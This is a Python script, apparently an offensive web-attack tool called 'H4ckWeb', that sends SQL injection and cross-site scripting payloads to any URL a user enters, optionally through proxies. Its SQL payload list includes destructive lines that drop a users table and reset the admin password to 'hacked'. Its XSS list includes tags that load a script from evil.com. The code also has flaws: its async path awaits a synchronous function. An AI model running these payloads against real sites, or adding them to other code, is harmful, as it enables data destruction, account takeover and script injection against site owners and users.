import requests
import threading
import logging
import argparse
import time
import os
from urllib.parse import urlparse
import art
import random
from itertools import cycle
import asyncio
import base64

# Set up logging to both console and file
def setup_logging():
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)

    # File Handler
    file_handler = logging.FileHandler('logs.txt')
    file_handler.setLevel(logging.INFO)

    # Formatter
    formatter = logging.Formatter('%(asctime)s - %(message)s')
    file_handler.setFormatter(formatter)

    logger.addHandler(file_handler)

# Clear the screen for CMD
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# SQL Injection Tool
class SQLInjectionTool:
    def __init__(self, target_url, proxies=None, timeout=5, headers=None, use_async=False):
        self.target_url = target_url
        self.proxies = proxies
        self.timeout = timeout
        self.use_async = use_async
        self.session = requests.Session()
        self.session.headers.update(headers or {})
        if self.proxies:
            self.session.proxies = self.proxies

    def inject(self, payload):
        url = f"{self.target_url}?id={payload}"
        try:
            response = self.session.get(url, timeout=self.timeout)
            if self.is_vulnerable(response):
                return response.text
            return None
        except requests.exceptions.RequestException as e:
            logging.error(f"Error occurred while testing payload '{payload}': {e}")
            return None

    def is_vulnerable(self, response):
        if "error" in response.text.lower() or "warning" in response.text.lower():
            return True
        if "database" in response.text.lower():
            return True
        return False

    def generate_payloads(self):
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT null, username, password FROM users --",
            "' AND 1=2 --",
            "' OR EXISTS(SELECT * FROM users) --",
            "1' OR 1=1 --",
            "1' UNION ALL SELECT NULL, username, password FROM users --",
            "' AND SLEEP(5) --",  # Time-based payload
            "1' OR sleep(5) --",   # Another sleep-based payload
            "' AND 1=1 --", 
            "' AND 1=2 --",  # Blind injection attempt
            "' UNION SELECT NULL, NULL, NULL, NULL --",
            "1' AND 1=2",  # Testing for blind injections
            "1' AND SLEEP(5) --",  # Time-based attack to detect vulnerability
            "' OR 1=1; DROP TABLE users --",  # Dangerous payload to drop tables
            "' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin' --"  # Password update
        ]
        return payloads

    def run(self):
        payloads = self.generate_payloads()
        threads = []

        if self.use_async:
            from asyncio import run, gather
            async def async_inject(payload):
                result = await self.inject(payload)
                if result:
                    logging.info(f"SQL Injection vulnerability detected with payload '{payload}'. Response:\n{result}\n")
                else:
                    logging.info(f"No vulnerability detected with payload '{payload}'.")
            
            tasks = [async_inject(payload) for payload in payloads]
            run(gather(*tasks))
        else:
            for payload in payloads:
                thread = threading.Thread(target=self.test_payload, args=(payload,))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

    def test_payload(self, payload):
        logging.info(f"Testing payload: {payload}")
        result = self.inject(payload)
        if result:
            logging.info(f"SQL Injection vulnerability detected with payload '{payload}'. Response:\n{result}\n")
        else:
            logging.info(f"No vulnerability detected with payload '{payload}'.")

# XSS Tool
class XSSTool:
    def __init__(self, target_url, proxies=None, timeout=5, headers=None):
        self.target_url = target_url
        self.proxies = proxies
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(headers or {})
        if self.proxies:
            self.session.proxies = self.proxies

    def inject(self, payload):
        url = f"{self.target_url}?q={payload}"
        try:
            response = self.session.get(url, timeout=self.timeout)
            if self.is_vulnerable(payload, response):
                return response.text
            return None
        except requests.exceptions.RequestException as e:
            logging.error(f"Error occurred while testing payload '{payload}': {e}")
            return None

    def is_vulnerable(self, payload, response):
        if payload in response.text:
            return True
        return False

    def generate_payloads(self):
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')" />',
            '<script src="http://evil.com/malicious.js"></script>',
            '<svg/onload=alert("XSS")>',
            '<body onload="alert(\'XSS\')">',
            '<a href="javascript:alert(\'XSS\')">Click me</a>',
            '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
            '"><script>alert(1)</script>',
            '%3Cscript%3Ealert(%27XSS%27)%3C/script%3E',  # URL encoded
            '<a href="javascript:alert(String.fromCharCode(88,83,83))">Click here</a>',  # Obfuscated XSS
            "<iframe src='javascript:alert(1)'></iframe>",  # Injecting iframe
            '<script>document.write("<img src=x onerror=alert(\'XSS\')>");</script>',  # Dynamic XSS generation
            '"><img src="x" onerror="alert(String.fromCharCode(88,83,83))">',  # Another obfuscated variant
            "<iframe src='javascript:alert(1)'></iframe>",  # Stealth iframe
            "<script src=//evil.com/malicious.js></script>"  # External malicious script
        ]
        return payloads

    def run(self):
        payloads = self.generate_payloads()
        for payload in payloads:
            logging.info(f"Testing payload: {payload}")
            result = self.inject(payload)
            if result:
                logging.info(f"XSS vulnerability detected with payload '{payload}'. Response:\n{result}\n")
            else:
                logging.info(f"No vulnerability detected with payload '{payload}'.")

# Menu System
def print_intro():
    clear_screen()
    ascii_art = art.text2art("H4ckWeb")
    print(ascii_art)
    print("="*60)
    print("1 - SQL Injection Tool")
    print("2 - XSS Tool")
    print("="*60)

def parse_args():
    parser = argparse.ArgumentParser(description="Advanced SQL Injection and XSS Tool")
    parser.add_argument("target_url", help="Target URL for testing", nargs='?')
    parser.add_argument("--proxies", help="Proxies in the format http://ip:port")
    parser.add_argument("--timeout", type=int, default=5, help="Request timeout in seconds")
    parser.add_argument("--headers", help="Optional custom headers for requests", nargs="*", default=[])
    return parser.parse_args()

def get_target_url():
    while True:
        target_url = input("Enter the target URL: ")
        if target_url.strip():
            return target_url
        print("Target URL cannot be empty. Please enter a valid URL.")

def return_to_menu():
    input("all info saved to logs.txt Press Enter to return to the main menu...")

if __name__ == "__main__":
    setup_logging()
    while True:
        print_intro()
        choice = input("Choose an option (1/2): ")

        if choice == "1":
            # SQL Injection Tool
            args = parse_args()
            if not args.target_url:
                args.target_url = get_target_url()
            headers = {header.split(":")[0]: header.split(":")[1] for header in args.headers} if args.headers else None
            proxies = {"http": args.proxies, "https": args.proxies} if args.proxies else None
            sqli_tool = SQLInjectionTool(args.target_url, proxies, timeout=args.timeout, headers=headers)
            sqli_tool.run()
            return_to_menu()

        elif choice == "2":
            # XSS Tool
            args = parse_args()
            if not args.target_url:
                args.target_url = get_target_url()
            headers = {header.split(":")[0]: header.split(":")[1] for header in args.headers} if args.headers else None
            proxies = {"http": args.proxies, "https": args.proxies} if args.proxies else None
            xss_tool = XSSTool(args.target_url, proxies, timeout=args.timeout, headers=headers)
            xss_tool.run()
            return_to_menu()

        else:
            print("Invalid choice. Exiting.")
            break
